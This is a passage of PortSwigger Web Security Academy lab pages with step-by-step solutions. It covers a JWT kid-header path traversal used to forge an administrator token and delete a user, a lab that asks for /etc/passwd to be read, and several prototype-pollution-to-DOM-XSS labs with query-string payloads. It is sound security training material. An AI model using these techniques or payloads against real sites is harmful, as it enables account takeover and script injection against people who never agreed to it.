                    href="https://portswigger.net/academy/labs/launch/b798d10d5ebbe86319083eaa1218f27ff9fe579f9e6e02a894077bb0cfe771e0?referrer=%2fweb-security%2fjwt%2flab-jwt-authentication-bypass-via-kid-header-path-traversal"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <div class="highlightedarea">
                                <h4>
                                    Note
                                </h4>
                                <p>
                                    In this solution, we'll point the
                                    <code>
        kid
       </code>
                                    parameter to the standard file
                                    <code>
        /dev/null
       </code>
                                    . In practice, you can point the
                                    <code>
        kid
       </code>
                                    parameter to any file with predictable contents.
                                </p>
                            </div>
                            <h5>
                                Generate a suitable signing key
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In Burp, load the JWT Editor extension from the BApp store.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the lab, log in to your own account and send the post-login
                                        <code>
         GET /my-account
        </code>
                                        request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, change the path to
                                        <code>
         /admin
        </code>
                                        and send the request. Observe that the admin panel is only accessible when
                                        logged in as the
                                        <code>
         administrator
        </code>
                                        user.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the
                                        <strong>
                                            JWT Editor Keys
                                        </strong>
                                        tab in Burp's main tab bar.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            New Symmetric Key
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the dialog, click
                                        <strong>
                                            Generate
                                        </strong>
                                        to generate a new key in JWK format. Note that you don't need to select a key
                                        size as this will automatically be updated later.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Replace the generated value for the
                                        <code>
         k
        </code>
                                        property with a Base64-encoded null byte (
                                        <code>
         AA==
        </code>
                                        ). Note that this is just a workaround because the JWT Editor extension won't
                                        allow you to sign tokens using an empty string.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            OK
                                        </strong>
                                        to save the key.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Modify and sign the JWT
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Go back to the
                                        <code>
         GET /admin
        </code>
                                        request in Burp Repeater and switch to the extension-generated
                                        <strong>
                                            JSON Web Token
                                        </strong>
                                        message editor tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the header of the JWT, change the value of the
                                        <code>
         kid
        </code>
                                        parameter to a
                                        <a href="https://portswigger.net/web-security/file-path-traversal">
                                            path traversal
                                        </a>
                                        sequence pointing to the
                                        <code>
         /dev/null
        </code>
                                        file:
                                    </p>
                                    <code>
        ../../../../../../../dev/null
       </code>
                                </li>
                                <li>
                                    <p>
                                        In the JWT payload, change the value of the
                                        <code>
         sub
        </code>
                                        claim to
                                        <code>
         administrator
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        At the bottom of the tab, click
                                        <strong>
                                            Sign
                                        </strong>
                                        , then select the symmetric key that you generated in the previous section.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Make sure that the
                                        <strong>
                                            Don't modify header
                                        </strong>
                                        option is selected, then click
                                        <strong>
                                            OK
                                        </strong>
                                        . The modified token is now signed using a null byte as the secret key.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request and observe that you have successfully accessed the admin
                                        panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the response, find the URL for deleting
                                        <code>
         carlos
        </code>
                                        (
                                        <code>
         /admin/delete?username=carlos
        </code>
                                        ). Send the request to this endpoint to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Discovering vulnerabilities quickly with targeted scanning
                (essential-skills)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the
                lab, retrieve the contents of
                <code>
   /etc/passwd
  </code>
                within 10 minutes.
            </p>
            <p>
                Due to the tight time limit, we recommend using
                <a href="https://portswigger.net/burp/vulnerability-scanner">
                    Burp Scanner
                </a>
                to help you. You can obviously scan the entire site to identify the vulnerability, but this might not
                leave you enough time to solve the lab. Instead, use your intuition to identify endpoints that are
                likely to be vulnerable, then try running a
                <a
                    href="https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing#scanning-a-specific-request">
                    targeted scan on a specific request
                </a>
                . Once Burp Scanner has identified an attack vector, you can use your own expertise to find a way to
                exploit it.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                If you get stuck, try looking up our Academy topic on the identified vulnerability
                                class.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/096e751392d26a789766b80531b5930fe3295d0856c2e072ab0818276834af9e?referrer=%2fweb-security%2fessential-skills%2fusing-burp-scanner-during-manual-testing%2flab-discovering-vulnerabilities-quickly-with-targeted-scanning"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                This lab is designed to help you learn how targeted scans can assist you with basic
                                recon. As such, we will not be providing a step-by-step solution.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Client-side prototype pollution via browser APIs
                (prototype-pollution)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                via client-side
                <a href="https://portswigger.net/web-security/prototype-pollution">
                    prototype pollution
                </a>
                . The website's developers have noticed a potential gadget and attempted to patch it. However, you can
                bypass the measures they've taken.
            </p>
            <p>
                To solve the lab:
            </p>
            <ol>
                <li>
                    <p>
                        Find a source that you can use to add arbitrary properties to the global
                        <code>
     Object.prototype
    </code>
                        .
                    </p>
                </li>
                <li>
                    <p>
                        Identify a gadget property that allows you to execute arbitrary JavaScript.
                    </p>
                </li>
                <li>
                    <p>
                        Combine these to call
                        <code>
     alert()
    </code>
                        .
                    </p>
                </li>
            </ol>
            <p>
                You can solve this lab manually in your browser, or use
                <a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader">
                    DOM Invader
                </a>
                to help you.
            </p>
            <p>
                This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details,
                check out
                <a href="https://portswigger.net/research/widespread-prototype-pollution-gadgets">
                    Widespread prototype pollution gadgets
                </a>
                by
                <a href="https://portswigger.net/research/gareth-heyes">
                    Gareth Heyes
                </a>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/9f29effeafaa743b0f87d5682f68184437df0b23db7ce32b2377869a95045976?referrer=%2fweb-security%2fprototype-pollution%2fclient-side%2fbrowser-apis%2flab-prototype-pollution-client-side-prototype-pollution-via-browser-apis"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span>
                            </span>
                            Manual solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                <strong>
                                    Find a prototype pollution source
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        In your browser, try polluting
                                        <code>
         Object.prototype
        </code>
                                        by injecting an arbitrary property via the query string:
                                    </p>
                                    <code class="code-scrollable">
        /?__proto__[foo]=bar
       </code>
                                </li>
                                <li>
                                    <p>
                                        Open the browser DevTools panel and go to the
                                        <strong>
                                            Console
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Enter
                                        <code>
         Object.prototype
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the properties of the returned object and observe that your injected
                                        <code>
         foo
        </code>
                                        property has been added. You've successfully found a prototype pollution source.
                                    </p>
                                </li>
                            </ol>
                            <p>
                                <strong>
                                    Identify a gadget
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        In the browser DevTools panel, go to the
                                        <strong>
                                            Sources
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the JavaScript files that are loaded by the target site and look for any
                                        DOM
                                        <a href="https://portswigger.net/web-security/cross-site-scripting">
                                            XSS
                                        </a>
                                        sinks.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In
                                        <code>
         searchLoggerConfigurable.js
        </code>
                                        , notice that if the
                                        <code>
         config
        </code>
                                        object has a
                                        <code>
         transport_url
        </code>
                                        property, this is used to dynamically append a script to the DOM.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that a
                                        <code>
         transport_url
        </code>
                                        property is defined for the
                                        <code>
         config
        </code>
                                        object, so this doesn't appear to be vulnerable.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that the next line uses the
                                        <code>
         Object.defineProperty()
        </code>
                                        method to make the
                                        <code>
         transport_url
        </code>
                                        unwritable and unconfigurable. However, notice that it doesn't define a
                                        <code>
         value
        </code>
                                        property.
                                    </p>
                                </li>
                            </ol>
                            <p>
                                <strong>
                                    Craft an exploit
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        Using the prototype pollution source you identified earlier, try injecting an
                                        arbitrary value property:
                                    </p>
                                    <code class="code-scrollable">
        /?__proto__[value]=foo
       </code>
                                </li>
                                <li>
                                    <p>
                                        In the browser DevTools panel, go to the
                                        <strong>
                                            Elements
                                        </strong>
                                        tab and study the HTML content of the page. Observe that a
                                        <code>
         &lt;script&gt;
        </code>
                                        element has been rendered on the page, with the
                                        <code>
         src
        </code>
                                        attribute
                                        <code>
         foo
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Modify the payload in the URL to inject an XSS proof-of-concept. For example,
                                        you can use a
                                        <code>
         data:
        </code>
                                        URL as follows:
                                    </p>
                                    <code class="code-scrollable">
        /?__proto__[value]=data:,alert(1);
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that the
                                        <code>
         alert(1)
        </code>
                                        is called and the lab is solved.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span>
                            </span>
                            DOM Invader solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Load the lab in Burp's built-in browser.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling">
                                            Enable DOM Invader
                                        </a>
                                        and
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution">
                                            enable the prototype pollution option
                                        </a>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Open the browser DevTools panel, go to the
                                        <strong>
                                            DOM Invader
                                        </strong>
                                        tab, then reload the page.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that DOM Invader has identified two prototype pollution vectors in the
                                        <code>
         search
        </code>
                                        property i.e. the query string.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            Scan for gadgets
                                        </strong>
                                        . A new tab opens in which DOM Invader begins scanning for gadgets using the
                                        selected source.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        When the scan is complete, open the DevTools panel in the same tab as the scan,
                                        then go to the
                                        <strong>
                                            DOM Invader
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that DOM Invader has successfully accessed the
                                        <code>
         script.src
        </code>
                                        sink via the
                                        <code>
         value
        </code>
                                        gadget.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            Exploit
                                        </strong>
                                        . DOM Invader automatically generates a proof-of-concept exploit and calls
                                        <code>
         alert(1)
        </code>
                                        .
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: DOM
                <a href="https://portswigger.net/web-security/cross-site-scripting">
                    XSS
                </a>
                via client-side prototype pollution
                (prototype-pollution)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                via client-side
                <a href="https://portswigger.net/web-security/prototype-pollution">
                    prototype pollution
                </a>
                . To solve the lab:
            </p>
            <ol>
                <li>
                    <p>
                        Find a source that you can use to add arbitrary properties to the global
                        <code>
     Object.prototype
    </code>
                        .
                    </p>
                </li>
                <li>
                    <p>
                        Identify a gadget property that allows you to execute arbitrary JavaScript.
                    </p>
                </li>
                <li>
                    <p>
                        Combine these to call
                        <code>
     alert()
    </code>
                        .
                    </p>
                </li>
            </ol>
            <p>
                You can solve this lab manually in your browser, or use
                <a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader">
                    DOM Invader
                </a>
                to help you.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/779d6590142ec062340c7103fc3f043c4a7fcf81748ef0740fc02b5dec467114?referrer=%2fweb-security%2fprototype-pollution%2fclient-side%2flab-prototype-pollution-dom-xss-via-client-side-prototype-pollution"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span>
                            </span>
                            Manual solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                <strong>
                                    Find a prototype pollution source
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        In your browser, try polluting
                                        <code>
         Object.prototype
        </code>
                                        by injecting an arbitrary property via the query string:
                                    </p>
                                    <code class="code-scrollable">
        /?__proto__[foo]=bar
       </code>
                                </li>
                                <li>
                                    <p>
                                        Open the browser DevTools panel and go to the
                                        <strong>
                                            Console
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Enter
                                        <code>
         Object.prototype
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the properties of the returned object. Observe that it now has a
                                        <code>
         foo
        </code>
                                        property with the value
                                        <code>
         bar
        </code>
                                        . You've successfully found a prototype pollution source.
                                    </p>
                                </li>
                            </ol>
                            <p>
                                <strong>
                                    Identify a gadget
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        In the browser DevTools panel, go to the
                                        <strong>
                                            Sources
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the JavaScript files that are loaded by the target site and look for any
                                        DOM XSS sinks.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In
                                        <code>
         searchLogger.js
        </code>
                                        , notice that if the
                                        <code>
         config
        </code>
                                        object has a
                                        <code>
         transport_url
        </code>
                                        property, this is used to dynamically append a script to the DOM.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that no
                                        <code>
         transport_url
        </code>
                                        property is defined for the
                                        <code>
         config
        </code>
                                        object. This is a potential gadget for controlling the
                                        <code>
         src
        </code>
                                        of the
                                        <code>
         &lt;script&gt;
        </code>
                                        element.
                                    </p>
                                </li>
                            </ol>
                            <p>
                                <strong>
                                    Craft an exploit
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        Using the prototype pollution source you identified earlier, try injecting an
                                        arbitrary
                                        <code>
         transport_url
        </code>
                                        property:
                                    </p>
                                    <code class="code-scrollable">
        /?__proto__[transport_url]=foo
       </code>
                                </li>
                                <li>
                                    <p>
                                        In the browser DevTools panel, go to the
                                        <strong>
                                            Elements
                                        </strong>
                                        tab and study the HTML content of the page. Observe that a
                                        <code>
         &lt;script&gt;
        </code>
                                        element has been rendered on the page, with the
                                        <code>
         src
        </code>
                                        attribute
                                        <code>
         foo
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Modify the payload in the URL to inject an XSS proof-of-concept. For example,
                                        you can use a
                                        <code>
         data:
        </code>
                                        URL as follows:
                                    </p>
                                    <code class="code-scrollable">
        /?__proto__[transport_url]=data:,alert(1);
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that the
                                        <code>
         alert(1)
        </code>
                                        is called and the lab is solved.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span>
                            </span>
                            DOM Invader solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Open the lab in Burp's built-in browser.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling">
                                            Enable DOM Invader
                                        </a>
                                        and
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution">
                                            enable the prototype pollution option
                                        </a>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Open the browser DevTools panel, go to the
                                        <strong>
                                            DOM Invader
                                        </strong>
                                        tab, then reload the page.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that DOM Invader has identified two prototype pollution vectors in the
                                        <code>
         search
        </code>
                                        property i.e. the query string.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            Scan for gadgets
                                        </strong>
                                        . A new tab opens in which DOM Invader begins scanning for gadgets using the
                                        selected source.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        When the scan is complete, open the DevTools panel in the same tab as the scan,
                                        then go to the
                                        <strong>
                                            DOM Invader
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that DOM Invader has successfully accessed the
                                        <code>
         script.src
        </code>
                                        sink via the
                                        <code>
         transport_url
        </code>
                                        gadget.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            Exploit
                                        </strong>
                                        . DOM Invader automatically generates a proof-of-concept exploit and calls
                                        <code>
         alert(1)
        </code>
                                        .
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: DOM XSS via an alternative prototype pollution vector
                (prototype-pollution)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                via client-side
                <a href="https://portswigger.net/web-security/prototype-pollution">
                    prototype pollution
                </a>
                . To solve the lab:
            </p>
            <ol>
                <li>
                    <p>
                        Find a source that you can use to add arbitrary properties to the global
                        <code>
     Object.prototype
    </code>
                        .
                    </p>
                </li>
                <li>
                    <p>
                        Identify a gadget property that allows you to execute arbitrary JavaScript.
                    </p>
                </li>
                <li>
                    <p>
                        Combine these to call
                        <code>
     alert()
    </code>
                        .
                    </p>
                </li>
            </ol>
            <p>
                You can solve this lab manually in your browser, or use
                <a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader">
                    DOM Invader
                </a>
                to help you.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Pay attention to the
                                <a href="https://portswigger.net/web-security/cross-site-scripting/contexts">
                                    XSS context
                                </a>
                                . You need to adjust your payload slightly to ensure that the JavaScript syntax remains
                                valid following your injection.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/3c3d65889eb00f3949889451470ca5fffc13f3a2bf9cc1d93d539073460c15a1?referrer=%2fweb-security%2fprototype-pollution%2fclient-side%2flab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span>
                            </span>
                            Manual solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                <strong>
                                    Find a prototype pollution source
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        In your browser, try polluting
                                        <code>
         Object.prototype
        </code>
                                        by injecting an arbitrary property via the query string:
                                    </p>
                                    <code class="code-scrollable">
        /?__proto__[foo]=bar
       </code>
                                </li>
                                <li>
                                    <p>
                                        Open the browser DevTools panel and go to the
                                        <strong>
                                            Console
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Enter
                                        <code>
         Object.prototype
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the properties of the returned object and observe that your injected
                                        <code>
         foo
        </code>
                                        property has not been added.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Back in the query string, try using an alternative prototype pollution vector:
                                    </p>
                                    <code class="code-scrollable">
        /?__proto__.foo=bar
       </code>
                                </li>
                                <li>
                                    <p>
                                        In the console, enter
                                        <code>
         Object.prototype
        </code>
                                        again. Notice that it now has its own
                                        <code>
         foo
        </code>
                                        property with the value
                                        <code>
         bar
        </code>
                                        . You've successfully found a prototype pollution source.
                                    </p>
                                </li>
                            </ol>
                            <p>
                                <strong>
                                    Identify a gadget
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        In the browser DevTools panel, go to the
                                        <strong>
                                            Sources
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the JavaScript files that are loaded by the target site and look for any
                                        DOM XSS sinks.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that there is an
                                        <code>
         eval()
        </code>
                                        sink in
                                        <code>
         searchLoggerAlternative.js
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that the
                                        <code>
         manager.sequence
        </code>
                                        property is passed to
                                        <code>
         eval()
        </code>
                                        , but this isn't defined by default.
                                    </p>
                                </li>
                            </ol>
                            <p>
                                <strong>
                                    Craft an exploit
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        Using the prototype pollution source you identified earlier, try injecting an
                                        arbitrary
                                        <code>
         sequence
        </code>
                                        property containing an XSS proof-of-concept payload:
                                    </p>
                                    <code class="code-scrollable">
        /?__proto__.sequence=alert(1)
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that the payload doesn't execute.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the browser DevTools panel, go to the
                                        <strong>
                                            Console
                                        </strong>
                                        tab. Observe that you have triggered an error.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click the link at the top of the stack trace to jump to the line where
                                        <code>
         eval()
        </code>
                                        is called.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click the line number to add a breakpoint to this line, then refresh the page.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Hover the mouse over the
                                        <code>
         manager.sequence
        </code>
                                        reference and observe that its value is
                                        <code>
         alert(1)1
        </code>
                                        . This indicates that we have successfully passed our payload into the sink, but
                                        a numeric
                                        <code>
         1
        </code>
                                        character is being appended to it, resulting in invalid JavaScript syntax.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click the line number again to remove the breakpoint, then click the play icon
                                        at the top of the browser window to resume code execution.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Add trailing minus character to the payload to fix up the final JavaScript
                                        syntax:
                                    </p>
                                    <code class="code-scrollable">
        /?__proto__.sequence=alert(1)-
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that the
                                        <code>
         alert(1)
        </code>
                                        is called and the lab is solved.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span>
                            </span>
                            DOM Invader solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Load the lab in Burp's built-in browser.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling">
                                            Enable DOM Invader
                                        </a>
                                        and
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution">
                                            enable the prototype pollution option
                                        </a>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Open the browser DevTools panel and go to the
                                        <strong>
                                            DOM Invader
                                        </strong>
                                        tab and reload the page.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that DOM Invader has identified a prototype pollution vector in the
                                        <code>
         search
        </code>
                                        property i.e. the query string.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            Scan for gadgets
                                        </strong>
                                        . A new tab opens in which DOM Invader begins scanning for gadgets using the
                                        selected source.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        When the scan is complete, open the DevTools panel in the same tab as the scan,
                                        then go to the
                                        <strong>
                                            DOM Invader
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that DOM Invader has successfully accessed the
                                        <code>
         eval()
        </code>
                                        sink via the
                                        <code>
         sequence
        </code>
                                        gadget.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            Exploit
                                        </strong>
                                        . Observe that DOM Invader's auto-generated proof-of-concept doesn't trigger an
                                        <code>
         alert()
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go back to the previous browser tab and look at the
                                        <code>
         eval()
        </code>
                                        sink again in DOM Invader. Notice that following the closing canary string, a
                                        numeric
                                        <code>
         1
        </code>
                                        character has been appended to the payload.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            Exploit
                                        </strong>
                                        again. In the new tab that loads, append a minus character (
                                        <code>
         -
        </code>
                                        ) to the URL and reload the page.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that the
                                        <code>
         alert(1)
        </code>
                                        is called and the lab is solved.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Client-side prototype pollution via flawed sanitization
                (prototype-pollution)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                via client-side
                <a href="https://portswigger.net/web-security/prototype-pollution">
                    prototype pollution
                </a>
                . Although the developers have implemented measures to prevent prototype pollution, these can be easily
                bypassed.
            </p>
            <p>
                To solve the lab:
            </p>
            <ol>
                <li>
                    <p>
                        Find a source that you can use to add arbitrary properties to the global
                        <code>
     Object.prototype
    </code>
                        .
                    </p>
                </li>
                <li>
                    <p>
                        Identify a gadget property that allows you to execute arbitrary JavaScript.
                    </p>
                </li>
                <li>
                    <p>
                        Combine these to call
                        <code>
     alert()
    </code>
                        .
                    </p>
                </li>
            </ol>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/e62603f6c9b96d8f356c0843377815ce5de0b885389f3cad18552a666cd8246c?referrer=%2fweb-security%2fprototype-pollution%2fclient-side%2flab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
